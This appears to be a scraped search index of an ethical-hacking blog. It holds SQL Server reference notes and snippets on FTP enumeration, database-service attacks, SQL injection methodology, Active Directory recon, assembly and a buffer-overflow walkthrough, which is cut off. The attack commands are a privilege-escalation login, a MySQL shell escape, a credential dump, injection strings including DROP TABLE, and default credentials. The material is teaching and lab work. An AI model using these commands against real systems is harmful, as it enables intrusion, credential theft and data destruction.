Enables creating an item in SQL Server. For example, database, table, view, users, index and more CREATE DATABASE database_name ALTER Enables modification of an existing object   DROP Drops and existing object DROP TABLE table_name COLLATION Defines the collation of a database or table column, or a collation cast operation when applied toa character string expression. Assigns certain characteristics to data.   USE Changes the database context to the specified database (Switch between databases) USE database_name Database ObjectsData TypesData Types are an attribute that specifies the type of data an object can hold, such as date and time, binary strings, monetary data, integer data. Data Types have several characteristics: Each column, local variable, expression, and parameter has a related data type. Data type of the results is determined by the applying rules of data type precedence to data types of input expressions (handled by the SQL Server engine). Collation of result is determined by rules of the collation precedence when result data type is char, varchar, text, nchar, ntext. Precision, scale, and length of a result depend on precision, scale, and length of input expressions. Data Type Statement Description Storage Approximate Numeric FLOAT Approximate-number data type to store the mantissa of the float number in scientific notation and dictates the precision and storage size. The default value of n = 53. FLOAT[(n)]: (n = 1 to 24) 7 digits and 4 bytesFLOAT[(n)]: (n = 25 to 53) 15 digits and 8 bytes Binary Strings BINARY Fixed-length binary data. BINARY[(n)]: (n = 1 to 8000) n bytes Character Strings CHAR Fixed-length string data. CHAR[(n)]: (n =1 to 8000 bytes) n x 2 bytes Date and Time DATE Defines a date in SQL Server   Exact Numeric TINYINT, SMALLINT, INT, BIGINT Exact-number data types that use integer data. Always use the smallest data type for your purpose! TINYINT: 0 to 255 : 1 byteSMALLINT: -2^15 to 2^15 : 2 bytesINT: 2^31 to 2^32 : 4 bytesBIGINT: -2^63 to 2^63 : 8 bytes Miscellaneous CURSOR For variables or stored procedure OUTPUT parameters that contain a reference to a cursor.   Unicode Character Strings NCHAR Fixed-length string data. NCHAR[(n)]: (n = string length in byte-pairs, n = 1 to 4000) n x 2 bytes   DECIMAL, NUMERIC Fixed precision and scale. Scale is number of decimals to the right of a decimal point (1 to 38 bytes with a default of 18) -10^38 + 1 to 10^38 -1   SMALLMONEY, MONEY Accurate to a ten-thousandth. Use a period to separate monetary units such as cents. SMALLMONEY: 4 bytesMONEY: 8 bytes   REAL 7 digits of precision making it identical to float(24). 4 bytes   NVARCHAR Variable-length string data. NVARCHAR[(n)]: (n = string length in byte-pairs, n = 1 to 4000) n x 2 bytes   IMAGE Variable-length binary blob data (images, documents, files, etc). IMAGE[(n)]: (n = 0 to 2^31 -1 bytes) 2GB   VARBINARY Variable-length binary data. VARBINARY[(n)]: (n = 1 to 8000)VARBINARY[(MAX)]: (n = 1 to 2^31 -1) 2GB, storage is the actual length of the data + 2 bytes.   DATETIME Date with time of day with fractional seconds and based on 24-hour clock.     DATETIME2 Expanded datetime with larder date range, default fractional precision, and user-specified precision.     DATETIMEOFFSET Date and time of day that has the time zone awareness and based on 24-hour clock.     SMALLDATETIME Datetime without seconds or fractional seconds.     VARCHAR Variable-length string data. VARCHAR[(n)]: (n = 1 to 8000)VARCHAR[(MAX)]: (n = 1 to 2^31 -1) 2GB, storage is the actual length of the data + 2 bytes.   TEXT Variable-length non-Unicode data in the code page of the server 2^31 -1 (2GB)   ROWVERSION Exposes automatically generated, unique binary numbers within a database that are generally used a mechanism for version-stamping table rows.     HIERARCHYID Variable-length, system data type that represents a position in a tree hierarchy.     UNIQUEGUIDIDENTIFIER 6-byte GUID created from NEWID or NEWSEQUENTIALID functions or converting a string constant in a certain format.     SQL_VARIANT Stores values of various SQL Server-supported data types.     XML Stores XML data     SPATIAL GEOMETRY AND GEOGRAPHY TABLES Implemented as a .NET common language runtime (CLR) data type for storing location specific data.     TABLE Primarily used for temporary storage of a set of rows returned as the result of a table-valued function.   Tables and ViewsTables Tables contain all the data in the database in a row-and-column format A table can have 1024 columns, and 30000 columns if using SPARSE Assign properties to a table and columns to use compression (by row or page)Views Virtual table defined by a query Similar to a table with named columns and rows that are produced dynamically when referenced Acts like a filter on tables and can reference multiple tables and provide a level of security (access to pre-created views can be assigned to a user instead of giving a user access to tables)Stored Procedures and FunctionsStored Procedures(%DATABASE%\\Programmability\\Stored Procedures)A subroutine available to applications that access a DB System, when creating a stored procedure CTL+SHIFT+M can be used to enter a templated view. A group of one or more Transact-SQL (T-SQL) statements or a reference to a Microsoft .Net Framework CLR method. Can accept input parameters and return multiple values as output parameters Have programming statements that perform operations within the database Return a status value indicating success or failureUsing stored procedures has a few benefits. Reduces server/client network traffic by saving the procedures on the server and only return the result to the client. Stronger security by containing stored procedures that have been validated and tested. Avoids SQL injection attackers where a client could manifest their own query. Reuse of Code – Write a stored procedure once and use it with multiple applications instead of writing the same code into multiple applications. Easier maintenance for applications, no changes in the client application Improved performance, speeds up network utilization and server execution.Functions(%DATABASE%\\Programmability\\Functions)Functions are routines that accept parameters, perform and action, and return the result of that action as a value. Allows for modular programming, faster execution, reduction of network traffic, scalar function, table-valued functions and system functions to return needed information.Data ManipulationData SelectionSelecting data is the most common statement used by applications to query data in the database. The below table displays the common statement and query clauses. Statement Description Example SELECT Retrieves rows from the database and enables you to select one or more columns or rows from one or many tables. SELECT * INTO copyoftableName FROM tableName FROM Specifies the tables, views, derived tables, and joined tables using in DELETE, SELECT, and UPDATE statements. SELECT SalesOrderID, SUM(LineTotal) AS SubTotalFROM Sales.SalesOrderDetail GROUP BY Clause that divides the query result into groups of rows, typically for performing aggregations. SELECT SalesOrderID, SUM(LineTotal) AS SubTotalFROM Sales.SalesOrderDetailGROUP BY SalesOrderID HAVING Typically used with GROUP BY in a SELECT statement as a search condition for a group or an aggregate. SELECT SalesOrderID, SUM(LineTotal) AS SubTotalFROM Sales.SalesOrderDetailGROUP BY SalesOrderIDHAVING SUM(LineTotal) &gt; 100000.00 ORDER BY Orders result set of a query by the specific column list. SELECT SalesOrderID, SalesOrderItemFROM Sale.SalesOrderIDORDER BY SalesOrderID UNION Combines results of two or more queries into a single results set that has all rows of each query in the union.   EXCEPT Returns distinct rows from left input query that aren’t output by right input query.   INTERSECT Returns distinct rows that are output by both left and righty input queries.   JOIN Defines the way two tables are related in a query.   TRUNCATE Removes all rows from a table or specified partitions of a table but doesn’t log row deletions making it much faster than DELETE if removing all rows in a table by using fewer system and transaction log resources. TRUNCATE TABLE TableName Data ModificationChanges existing data in a table or view, covered in above section on DML.Deleting DataUsed to delete existing records in a table, covered in above section on DML. DELETE Permissions are required on the target table as well as SELECT permissions if the statement contains a WHERE clause (and if no WHERE clause is used, all records will be deleted). TRUNCATE Is another statement used to delete rows and requires the ALTER permission on the specific table.Inserting DataAllows you to insert new records into a table. If adding values for all columns in a table, there is no need to specify the column names, otherwise order of values must match order of columns. INSERT permission is required.Data StorageNormalizationDatabase design technique that makes databases more efficient. Resolves issues of data redundancy and improves storage, data integrity and scalability. Also helps reduce INSERT, UPDATE, and DELETE anomalies.Normalization is structured under certain ‘Normal Forms’ as per the table below. Most organizations will design their database to 3NF. Statement Description First Normal Form (1NF) Eliminated repeating groups. No duplicate records exist in table and no multi-valued attributes. All entries in the column are of the same data type. Second Normal Form (2NF) Table is already 1NF, all partial dependencies are removed to another table(s). Third Normal Form (3NF) Table is already 2NF, eliminate non-dependent columns and transient dependencies. Fourth Normal Form (4NF) Already 3NF, no independent multiple relationships. Fifth Normal Form (5NF) Already 4NF, isolate semantically-related relationships. KeysKeys are the set of attributes that used to identify the specific row in a table and to find or create the relation between two or more tables i.e keys identify the rows by combining one or more columns. The table below identifies the main three keys: Key Type Description Primary Key (PK) Uniquely identifies each record in a table.– Cannot contain NULL values, must be UNIQUE– Only one Primary Key per table, using single or multiple fields Foreign Key (FK) Not just to a primary key constraint in another table, can reference columns of a UNIQUE constraint in another table.– Can only reference tables within the same database on the same server– Self-reference is allowed to reference another column in the same table– Column-level constraint must list only one reference column and be the same data type– Table-level constraint needs same number of reference columns and data types Composite Key A key that includes multiple columns. Can be designated as the primary key if the combination of the columns result in a unique composite value for every row in the table. Commonly used in tables designed with many to many relationships. Database AdministrationAuthentication, Users, Roles, and PermissionsHow to connect and login to access resources. There are multiple methods to authenticate.%SQL_SERVER%\\Security\\Logins\\ Authentication Method Description Additional Windows Authentication Commonly referred to as Integrated Security Preferred method as it provides a single sign-on for the OS and SQL Server. Windows Groups can be used to manage access. SQL Server and Windows Authentication Commonly referred to as Mixed-mode Security SQL Logins allow application-specific security and mixes OS access.– SQL Server Login: Server Role– Database User: Role, Application Role, or Group SQL Server Authentication Account Description Sysadmin Superuser role for the Server Database Users Windows LoginsSQL LoginsWindows Groups (AD)User without login Database Owner (DBO) Database Owner, mapped to Sysadmin Guest Logins without mapping are guest accounts. Recommended to disable. SQL Server Accounts Role Description Db_owner Perform all configuration and maintenance, including dropping a database Db_securityadmin Modify role membership and manage permissions Db_accessadmin Add or remove access to the database for Windows logins or groups, and SQL Server logins Db_backupoperator Can backup the database Db_ddladmin Can run any DDL command in a database Db_datawriter Can add, delete, or change data in all user tables Db_datareader Can read all data from all user tables Db_denydatawriter Restricts modification of data explicitly Db_denydatareader Restricts the reading of data from a database Public Assigned to all users Database Roles Permission Description GRANT Positive privilege DENY Negative privilege REVOKE Negates a GRANT or DENY ALTER Make changes to database objects BACKUP Backup Objects CONTROL Grants full access to objects CREATE Create Objects DELETE Delete objects DROP Drop databases or tables SELECT Select or read data from a table or view ENDPOINTs (Instance-Level) Sets configuration for access to the SQL Server instance. TCP/IP or network restrictions. ASSEMBLY and SERVICEs (Database-Level) ASSEMBLY references a .DLL, uploading an ASSEMBLY is the first step to allowing application roles and client access. TABLEs, VIEWs, PROCEDUREs, and QUEUEs (Schema-Level) Allows the locking down of access to specific tables, views, etc. (Column-Level) Restrict permissions to only specific columns PermissionsThere are many permissions that can be applied to an account in a granular access model. ~200 exposed permissions. Common permissions are as above in the Permissions table.Maintenance TasksConsiderations to take when maintaining a SQL Server instance are typically based in the following table: Task Description Statistics Used by the Query Optimize to compile an optimal execution plan. “Auto Update Statistics” is built-in and available to automatically do this. Index Fragmentation naturally occurs due to inserts, updates, and deletes and can impact performance negatively. To control fragmentation, the following methods can be employed.– Rebuild, reorganize, or disable-and-rebuild the index– Database Maintenance Plans– Custom Scripts in a SQL Agent Job– Third party tools Consistency Checks Corruption can occur, typically based on IO (disk Input/output). There are built-in checks to assist in identifying database corruption.– DBCC CHECKDB– DBCC CHECKALLOC– DBCC CHECKCATALOG– DBCC CHECKFILEGROUP– DBCC CHECKTABLE Backups and Disaster Recovery (DR) Backup Type Description Code Example Full All data in the database is backed up BACKUP DATABASE Differential Only backs up changed data from the last Full Backup BACKUP DATABASEWITH DIFFERENTIAL Transaction Log A log of all transactions carried out on the database BACKUP LOG Copy-Only Backup An ‘out-of-band’ backup that can be used to an immediate backup that doesn’t impact previously set backup strategies.   " }, { "title": "Port 21 - FTP", "url": "/posts/FTP_21/", "categories": "Ethical Hacking, Common Ports and Services", "tags": "ftp, port:21, nmap", "date": "2022-10-02 00:00:00 +1000", "snippet": "OverviewThe File Transfer Protocol (FTP) is a common protocol that is used across all operating systems to aid in remote file transfers between a client and server. FTP is a plaintext protocol, meaning that communication between a client and server are not encrypted. There is a secure version of FTP called SFTP that operates over the SSH port 22.A number of different FTP application exist that provide added functionality in addition to the native FTP tool, some of those commonly encountered are: FileZilla CyberDuck WinSCP FireFTPApart from individual application vulnerabilities that can be exploited to gain file or remote access to a host machine, there are a number of actions that can be taken to enumerate objects.ReconnaissancePort Scanning and EnumerationNmap has various scripts that can be run against the different versions, running a generic initial scan and including the -sC or -A flag will automatically scan with default scripts such as ftp-syst, and ftp-anon. Nmap Script Description ftp-syst Sends FTP SYST and STAT commands, returning the result ftp-anon Checks if an FTP server allows anonymous logins. To run all FTP scripts against a target (noisy), the below Nmap command can be used:sudo nmap -sC --script ftp-* -p 21 %IP%OutputThe following is the output provided by running a standard scan on target 10.10.10.10. Note that NSE scripts identify that Anonymous login is allowed (status code 230 - Login Successful), the FTP version is vsftpd 3.0.3, and two files were identified being hosted.sudo nmap -A 10.10.10.10...PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist|_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.10.10.9| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of statusConnecting to a Remote FTP ServerIn some cases, anonymous login to a remote FTP server will be allowed, enabling access to particular files or shared directories without authentication. In such cases, a common list of credentials are: Username Password anonymous   anonymous anonymous ftp ftp ftp 10.10.10.10# List all files, including those hiddenls -a# Download a filemget allowed.userlist" }, { "title": "Database Stores", "url": "/posts/Database_Stores/", "categories": "Ethical Hacking, Common Ports and Services", "tags": "sql, mysql, nosql, mariadb, port:1433, port:3306, nmap, metasploit, hydra, sqlmap", "date": "2022-10-02 00:00:00 +1000", "snippet": "OverviewRelational and Non-Relational databases are a valuable target for attackers, with sensitive information often stored within the database tables such as Personally Identifiable Information (PII) and credentials. There are also several vulnerabilities and misconfigurations that can be exploited by an attacker to gain remote shell access to the host running the platform, privilege escalation and malicious program execution.Relational DatabasesStructured Query Language (SQL) is a language specifically designed for managing structured data within relational database systems and is commonly used as backend storage for many software and web applications. See the post SQL Overview for more background information.There are multiple relational database management systems (RDBMS), some of the most commonly encountered, their default ports and tool applicability are listed in the below table: Service Port Nmap MSF Hydra SQLmap Other MSSQL 1433-1434 Crackmapexec Impacket MySQL/MariaDB 3306   Oracle 1521 Oscanner ODAT PostgreSQL 5432   SQL InjectionSee CAPEC 66 - SQL Injection for verbose information and steps involved in conducting a SQL Injection attack.Non-Relational DatabasesNon-Relational databases store data in a different format than Relational databases that rely on SQL. Non-Relational databases are often categorized as Not Only SQL (NoSQL) and are generally defined as a database that does not use tables, fields, and columns that structured data required. There are a few different catagories of Non-Relational databases such as; Document, Key-Value, Graph, File Systems, etc.As with the various RDBMS solutions, there are a number of Non-Relational systems, some of the most commonly encountered, their default ports and tool applicability are listed in the below table. Other solutions which aren’t typically listed as NoSQL databases are added here also, such as Redis and Memcached which are memory storage solutions and Hadoop, NFS, AFP, and iSCSI which are file systems. Service Port Nmap MSF Hydra Other AFP 548   Cassandra 9042     Hadoop HDFS 50070 50075 50090       Hadoop Mapreduce 50030 50060       Memcached 11211   MongoDB 27017   NFS 2049   NFSshell Redis 6579   iSCSI 3260     Open-iSCSI iSCSIadm MSSQLMicrosoft SQL Server (MSSQL) often exposes two ports: 1433 - Used by clients to interact with the database 1434 - Used to list available instances (a Server can run multiple instances on high ports)Default credentials are often set to sa:sa, which sa equivalent to Sysadmin.MSSQL Scanning and Enumeration Tool Script/Module Auth MITRE ATT&amp;CK Tactic Command MSF mssql_enum ? Reconnaissance   MSF mssql_ping ? Reconnaissance   Nmap ms-sql-info N Reconnaissance sudo nmap -A -p 1433,1434 -n 10.10.10.10 MSSQL Exploitation Tool Script/Module Auth MITRE ATT&amp;CK Tactic Command MSF mssql_escalate_dbowner mssql_escalate_escalate_as Y Privilege Escalation   MSF mssql_hashdump Y Credential Access   MSF mssql_idf Y Discovery   MSF mssql_local_auth_bypass Y Persistence Privilege Escalation   MSF mssql_ntlm_stealer Y Credential Access   MSF mssql_payload Y Execution   MSF mssql_sql_file Y Execution   MSSQL Database Interactionthe mssqlclient.py python tool that comes pre-installed on Kali Linux as part of the Impacket suite, can be used to interact with a remote MSSQL server.# Connecting to a Remote MSSQL Server (Requires Database selection, Domain, Username, Password, and IP address entry.)mssqlclient.py -db %DATABASE% -windows-auth %DOMAIN%/%USERNAME%:%PASSWORD%@%IP%# Database EnumerationSELECT * from %TABLE% # Show all stored data under a select tableSELECT * FROM %DATABASE%.INFORMATION_SCHEMA.TABLES; # Show tables under a select database# ExploitationCREATE LOGIN &amp;USERNAME% WITH PASSWORD = '&amp;PASSWORD%' # Create a new user and assign sysadmin privilegessp_addsrvrolemember '%USERNAME%', 'sysadmin'MySQL/MariaDBMySQL is commonly found running on either windows or linux servers. The original MySQL solution was bought by Oracle, the previous open-source variant was forked and is referred to as MariaDB.Default credentials are often set to root:, within some instances as per the example not requiring a password.MySQL/MariaDB Scanning and Enumeration Tool Script/Module Auth MITRE ATT&amp;CK Tactic Command MSF mysql_enum Y Reconnaissance   Nmap mysql-info N Reconnaissance sudo nmap -A -p 3306 -n 10.10.10.10 MySQL/MariaDB ExploitationMSSQL Database InteractionThe MySQL command line tool can be used to interface with a remote MySQL/MariaDB instance.# Accessing a Remote Servermysql -h 10.10.10.10 -u rootmysql -h 10.10.10.10 -u root -e 'show databases;'# Database Interactionshow databases; # Shows all available databasesuse %DATABASE%; # Enter a select databaseshow tables; # Show tables under a select databasedescribe %TABLE%; # Show details of a select tableselect * from %TABLE% # Show all stored data under a select table# Exploitation\\! sh # Drop into a shellmysql -h 10.10.10.10 -u root --password=%PASSWORD% -e \"SELECT * FROM mysql.user;\" # Credential Dumpingcreate user test identified by 'test'; # Create a new user and assign admin privilegesgrant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;" }, { "title": "CAPEC 66 - SQL Injection", "url": "/posts/66-SQL_Injection/", "categories": "Ethical Hacking, CAPEC", "tags": "sql injection", "date": "2022-10-02 00:00:00 +1000", "snippet": "OverviewWhen specially crafted user-controlled input containing SQL syntax is used as part of SQL queries without proper validation, it is possible to glean information from the database in ways not anticipated during application design. It may also be possible to use injection to have the database execute system-related commands of the attackers’ choice, depending on the database and the design of the application. SQL Injection allows an attacker to interact directly with the database, completely bypassing the application. Injection success can result in information disclosure as well as the ability to add or modify data in the database. CAPEC This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended. SQL Injection results from failure of the application to appropriately validate input. Techniques Explore Survey Application: The attacker first takes an inventory of the functionality exposed by the application. Spider web sites for all available links Sniff network communications with application using a utility such as WireShark. Experiment Determine user-controllable input susceptible to injection: Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a parenthesis, etc.). The goal is to create a SQL query with an invalid syntax. Use web browser to inject input through text fields or through HTTP GET parameters. Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc. Use network-level packet injection tools such as netcat to inject input Use modified client (modified by reverse engineering) to inject input. Experiment with SQL Injection vulnerabilities: After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database. Use public resources, and try different approaches for adding logic to SQL queries. Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : ' OR 1=1; --, or something else that would syntactically complete a hypothesized query. Iteratively refine the query. Use “Blind SQL Injection” techniques to extract information about the database schema. If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: “'; DROP TABLE SYSOBJECTS; -- and '); DROP TABLE SYSOBJECTS; --. These particular queries will likely not work because the SYSOBJECTS table is generally protected. Exploit Exploit SQL Injection vulnerability: After refining and adding various logic to SQL queries, craft and execute the underlying SQL query that will be used to attack the target system. The goal is to reveal, modify, and/or delete database data, using the knowledge obtained in the previous step. This could entail crafting and executing multiple SQL queries if a denial of service attack is the intent. Craft and Execute underlying SQL query Steps to Conduct an SQL Injection Explore Survey Application: Experiment Determine user-controllable input susceptible to injection: Experiment with SQL Injection vulnerabilities: Exploit Exploit SQL Injection vulnerability: Sources OWASP - SQL Injection OWASP - Testing for SQL Injection" }, { "title": "Active Directory", "url": "/posts/Active_Directory/", "categories": "Ethical Hacking, Windows", "tags": "active directory", "date": "2022-10-01 00:00:00 +1000", "snippet": "OverviewActive Directory (AD) enables system administrators to build and manage domains, users, and objects on a network. Active Directory offers a means to categorize Users into logical groups and subgroups in objects named Organizational Units (OUs) while supplying access control at each level. Active Directory servers are often promoted to Domain Controllers (DCs) as they are a central point of management for network authentication, authorization and core domain functionality.The Active Directory is divided into three main tiers: domains, trees, and forests. A domain is a collection of objects (users or devices). Multiple domains can be grouped together under a single domain, sub-domains are known as trees. A forest is a collection of trees that can be grouped together. Each of these levels can be given different access and communication privileges.Active Directory offers a variety of services that are grouped together as “Active Directory Domain Services,” or AD DS. Among these services are: Domain Services: Stores centralized data and manages user-domain communication; includes login authentication and search functionality. Certificate Services: Responsible for the creation, distribution, and management of secure certificates. Lightweight Directory Services (LDAP): Provides support for directory-enabled applications. Directory Federation Services: Enables a user to authenticate in multiple web applications in a single session using single-sign-on (SSO). Rights Management: Safeguards intellectual property by preventing unauthorized use and distribution of digital content. DNS/NTP/DHCP Services: This service is used to resolve domain names, act as a centralized time source, and can effectively manage a networks IP ranges and leases via DHCP.Without needing much mention, Active Directory/Domain Controllers are an extremely high valued target.TechniquesReconnaissanceIdentifying an Active Directory server can be achieved via the exposed ports and often the nomenclature of the server naming. Often Active Directory or Domain Controller servers will have the terms AD or DC within the hostname to identify it locally. Examples could appear like abcAD01 or abcDC02. It is important to note that AD servers are typically not publicly facing, unless they are misconfigured. As such, it is generally necessary for an adversary to have some level of access to the internal network in order to conduct reconnaissance on AD servers.Port scanning can reveal specific common ports that are exposed on Active Directory servers, such as the table below. Using Nmap to gain further information on specific ports can be achieved via NSE scripts. Reconnaissance activities assume that tasks are unauthenticated. Port Description 389 Lightweight Directory Access Protocol (LDAP) 445 Server Message Block (SMB) 464 Kerberos Password Change 500 IPsec ISAKMP 53 Domain Name Services (DNS) 636 Lightweight Directory Access Protocol over SSL Server (LDAPS) 88 Kerberos Authentication 4500 NAT-T 9389 Active Directory Web Services Active Directory Management Gateway Service 138 139 NetBIOS 3268 3269 Global Catalog 135 1024-5000 49152-65535 Remote Procedure Call (RPC) and Windows Management Instrumentation (WMI) Credential AccessIf access has been gained to the same network as the AD server, there are various attacks that can be used to gain credentials or relay credentials gathered. Some of these tools and techniques that aid in credential access against AD controlled networks are: CAPEC 94 - Adversary-in-the-Middle (AiTM)DiscoveryPost exploitation discovery can yield a lot of valuable information regarding an AD controller environment. Some tools and techniques available to perform discovery tasks to extract these objects of interest are: BloodHound Darkcybe - PowerShell-Empire GuideSources Microsoft - Active Directory Domain Services Overview" }, { "title": "Assembly Overview", "url": "/posts/Assembly_Overview/", "categories": "General IT and Security, Programming", "tags": "assembly", "date": "2022-09-30 00:00:00 +1000", "snippet": "OverviewAssembly programming is a low-level computer programming language that is used to write software that runs directly on a computer’s hardware. It is considered a low-level language because it is closer to the machine code that a computer can execute directly, as opposed to high-level languages like C, C++, and Python, which are closer to human-readable languages and require additional processing by a compiler or interpreter.CPU Architectures have differing ways of understanding and executing code also, several formats exist however arguably the most common and the one chosen for this post is the Intel x86 architecture.Core Assembly ComponentsThere are several fundamental components of assembly language, below is a list of some of the more commonly used components for malware analysis: Instructions: These are the basic building blocks of an assembly program, and they tell the CPU what to do. Each instruction consists of an operation and one or more operands. Examples of instructions include “mov”, “add”, and “cmp”. Registers: These are special memory locations inside the CPU that are used to store data temporarily during the execution of a program. There are different types of registers for different purposes, such as storing values, addressing memory, and holding flags. Operands: Operands are the values or addresses that are used by instructions. They can be registers, memory addresses, or constants. For example, in the instruction “mov eax, 5”, the register “eax” is the destination operand and the constant “5” is the source operand. Memory: This is where a program’s data and instructions are stored. Programs can access memory using addresses, which are assigned to specific locations in memory. Labels: These are used to give names to specific locations in a program’s code. Labels can be used to make it easier to read and understand the code, and they can also be used as destinations for jumps and calls. For example, a label might be used to mark the start of a loop or the location of a specific function.Common AssemblyBelow is a table of common assembly language instructions: Operand Description MOV Move data from one location to another ADD Add two values and store the result SUB Subtract one value from another and store the result MUL Multiply two values and store the result DIV Divide one value by another and store the result INC Increment a value by 1 DEC Decrement a value by 1 AND Perform a bitwise AND operation on two values and store the result OR Perform a bitwise OR operation on two values and store the result XOR Perform a bitwise XOR operation on two values and store the result NOT Perform a bitwise NOT operation on a value (inverts all the bits) SHL Shift the bits of a value left by a specified number of positions SHR Shift the bits of a value right by a specified number of positions JMP Jump to a specified location in the program JE Jump to a specified location if the last comparison resulted in equal JNE Jump to a specified location if the last comparison did not result in equal JG Jump to a specified location if the last comparison resulted in greater than JGE Jump to a specified location if the last comparison resulted in greater than or equal JL Jump to a specified location if the last comparison resulted in less than JLE Jump to a specified location if the last comparison resulted in less than or equal CMP Compare two values and set the status flags based on the result PUSH Push a value onto the stack POP Pop a value off the stack CALL Call a subroutine at a specified location RET Return from a subroutine INT Generate a software interrupt Below is a table of common assembly language registers: Register Description EAX The accumulator register, used for arithmetic and data transfer operations EBX The base register, used to hold a memory address ECX The count register, used as a loop counter and for shifts and rotates EDX The data register, used for arithmetic and data transfer operations ESI The source index register, used as a pointer to data in memory EDI The destination index register, used as a pointer to data in memory EBP The base pointer register, used to point to the base of the current stack frame ESP The stack pointer register, used to point to the top of the stack EIP The instruction pointer register, holds the address of the next instruction to be executed CF The carry flag, set if the last arithmetic operation resulted in a carry or borrow PF The parity flag, set if the last operation resulted in an even number of 1 bits AF The auxiliary carry flag, used in binary-coded decimal (BCD) arithmetic ZF The zero flag, set if the last operation resulted in a zero value SF The sign flag, set if the last operation resulted in a negative value OF The overflow flag, set if the last operation resulted in an overflow or underflow Here is a table of common assembly language labels: Label Description START The label for the beginning of the program END The label for the end of the program LOOP A label used to mark the beginning of a loop LOOPEND A label used to mark the end of a loop PROC A label used to mark the beginning of a subroutine or procedure PROCEND A label used to mark the end of a subroutine or procedure DATA A label used to mark the beginning of a data section in the program BSS A label used to mark the beginning of a block of memory that will be used for data storage but does not have any initial values Interpretation of Assembly LangagueIn the example below, there are some core sections that require a bit of explaining.0x00401000 push ebp0x00401001 mov ebp, esp0x00401003 sub esp, 80x00401006 lea eax, [var_8h]0x00401009 push eax0x0040100a push 0xf003f ; '?'0x0040100f push 00x00401011 push str.SOFTWARE__Microsoft___XPS ; 0x40c0400x00401016 push 0x800000020x0040101b call dword [RegOpenKeyExA] ; 0x40b0200x00401021 test eax, eax0x00401023 je 0x4010290x00401025 xor eax, eax0x00401027 jmp 0x401066In this example, there are several instructions that are being executed. The first instruction, push ebp, pushes the value of the EBP register onto the stack. The next instruction, mov ebp, esp, moves the value of the ESP register (the stack pointer) into the EBP register (the base pointer).The sub esp, 8 instruction subtracts 8 from the value of the ESP register, which is used to allocate space on the stack for local variables. The lea eax, [var_8h] instruction loads the address of the local variable var_8h into the EAX register.Other instructions in this example include push eax, which pushes the value of the EAX register onto the stack, and call dword [RegOpenKeyExA], which calls the RegOpenKeyExA function and passes it the values on the stack as arguments. The test eax, eax instruction tests the value of the EAX register, and the je 0x401029 instruction jumps to the specified address if the test is equal to zero.References Coding Den - The Compilation Process Tutorials Point - Assembly Conditions Aldeid - x86 Assembly Instructions" }, { "title": "CAPEC 100 - Overflow Buffers", "url": "/posts/100-Overflow_Buffers/", "categories": "Ethical Hacking, CAPEC", "tags": "buffer overflow", "date": "2022-09-29 00:00:00 +1000", "snippet": "OverviewBuffer overflow vulnerabilities are commonly targeted by exploiting buffer sizes. For example, if a buffer is set to allow 8 bytes however 10 are pushed to the buffer, the bytes can overflow into the next buffer. Below is a simple example depicting two buffers with a size of 8 bytes each. The second step depicts the push of 10 bytes to buffer 1, followed by the resulting buffer overflow of the extra two bytes that are ultimately pushed into buffer 2. Although the example depicts only 10 bytes being pushed to the buffer, this number can be increased and cause an overflow to multiple areas of memory that are located after the buffer. Buffer overflow will often result in an application crashing as integral data is overwritten by the overflow data.buffer1[8] = 0buffer2[8] = 0push 0123456789 to buffer1buffer1 = 0123456789buffer2 = 89Buffer Overflows can be controlled to allow shellcode execution and the ability for an attacker to gain root/system access on a host or have the targeted application perform contradictory operations such as allowing authentication in some instances.Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries’ choice. 1Techniques Explore Identify target application: The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management. Experiment Find injection vector: The adversary identifies an injection vector to deliver the excessive content to the targeted application’s buffer. Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible. Craft overflow content: The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary’s choosing. Create malicious shellcode that will execute when the program execution is returned to it. Use a NOP-sled in the overflow content to more easily “slide” into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs Exploit Overflow the buffer: Using the injection vector, the adversary injects the crafted overflow content into the buffer. Steps to Conduct a Buffer OverflowThe following examples are based on the Vulnserver application which is an intentionally vulnerable application specifically designed for testing these techniques against. The Immunity Debugger is being used to debug the code as the activities are conducted. Vulnserver and Immunity Debugger must be run as administrator during the testing.To setup the environment, two hosts are required: a Kali Linux host and a Windows 10 host. Install both Vulnserver and Immunity on the Windows 10 host. Explore Identify target application: Vulnserver is being used for this example. Experiment Find injection vector: Kali Linux has a built-in tool called generic_send_tcp that is used to generate TCP connections with the Vulnserver application and send data to the various inputs. The following is a sample of some of the inputs that are present on the Vulnserver application. This method of finding the injection vector is also referred to as spiking. STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] Using the generic_send_tcp, each buffer can be sent a large input in an attempt to identify buffer overflow vulnerabilities. The tool requires a spike_script to be compiled before running against an application. The generic command parameter to run the tool is generic_send_tcp host port spike_script SKIPVAR SKIPSTR. The spike_script should contain 